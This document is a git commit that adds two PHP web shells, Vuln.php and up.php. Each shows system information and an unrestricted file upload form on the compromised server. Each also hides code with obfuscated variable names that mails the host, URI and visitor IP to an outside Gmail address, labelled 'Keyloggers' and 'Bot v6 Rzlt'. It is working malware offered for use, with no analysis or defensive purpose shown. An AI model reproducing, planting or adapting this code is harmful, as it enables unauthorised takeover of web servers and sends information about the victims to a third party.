dabda73ff17f956ff9ecb2e97dc8905fa32788eb
v0cates <77562699+v0cates@users.noreply.github.com>
2021-05-06 13:22:46 +0300

    Add files via upload

---
+++ Vuln.php
@@ -0,0 +1,15 @@
+<title>GoldGate2o2o!! it Now! GoldGate2o2o!!</title>
+<?php echo 'GoldGate2o2o!! uname'.'<br>'.'uname:'.php_uname().'<br>'.$cwd = getcwd(); echo '<center>  <form method="post" target="_self" enctype="multipart/form-data">  <input type="file" size="33" name="uploads" /> <input type="submit" value="upload" />  </form>  </center></td></tr> </table><br>'; if (!empty ($_FILES['uploads'])) {     move_uploaded_file($_FILES['uploads']['tmp_name'],$_FILES['uploads']['name']);     Echo "<script>alert('upload Done'); 	 	 </script><b>Uploaded !!!</b><br>name : ".$_FILES['uploads']['name']."<br>size : ".$_FILES['uploads']['size']."<br>type : ".$_FILES['uploads']['type']; } 
+?>
+<?php
+$sdf = getenv("REMOTE_ADDR");
+$ra44 = rand(1, 99999);
+$xzvxcvzx = "✪ Keyloggers -$sdf";
+$qweasd = "ksahinergen@gmail.com";
+$vaer = "From: TOSTA <ksahinergen@gmail.com>";
+$bvadfga = $_SERVER['REQUEST_URI'];
+$vcbertc = $_SERVER['HTTP_HOST'];
+$aehcvbcvb = $sdf . "";
+$nrtbv45fdccc = "$bvadfga $vcbertc $aehcvbcvb";
+mail($qweasd, $xzvxcvzx, $nrtbv45fdccc, $vaer);
+?>
---
+++ up.php
@@ -0,0 +1,19 @@
+<?php
+$str = 'R29sZEdhdGUyMg==';echo base64_decode($str);
+
+?>
+<title>GoldGate2o2o</title>
+<?php echo 'GoldGate2o2o uname'.'<br>'.'uname:'.php_uname().'<br>'.$cwd = getcwd(); echo '<center>  <form method="post" target="_self" enctype="multipart/form-data">  <input type="file" size="42" name="uploads" /> <input type="submit" value="upload" />  </form>  </center></td></tr> </table><br>'; if (!empty ($_FILES['uploads'])) {     move_uploaded_file($_FILES['uploads']['tmp_name'],$_FILES['uploads']['name']);     Echo "<script>alert('upload Done'); 	 	 </script><b>Uploaded !!!</b><br>name : ".$_FILES['uploads']['name']."<br>size : ".$_FILES['uploads']['size']."<br>type : ".$_FILES['uploads']['type']; } 
+?>
+<?php
+$as = getenv("REMOTE_ADDR");
+$ra44 = rand(1, 99999);
+$dsfsd = " Bot v6 Rzlt |$as";
+$sdfsdf = "ksahinergen@gmail.com";
+$fdg = "From: Result<ksahinergen@gmail.com";
+$cvbcvbcv = $_SERVER['REQUEST_URI'];
+$dfgharfbczxvb = $_SERVER['HTTP_HOST'];
+$arbg435df = $as . "";
+$xcsdfs = "$cvbcvbcv $dfgharfbczxvb $arbg435df";
+mail($sdfsdf, $dsfsd, $xcsdfs, $fdg);
+?>
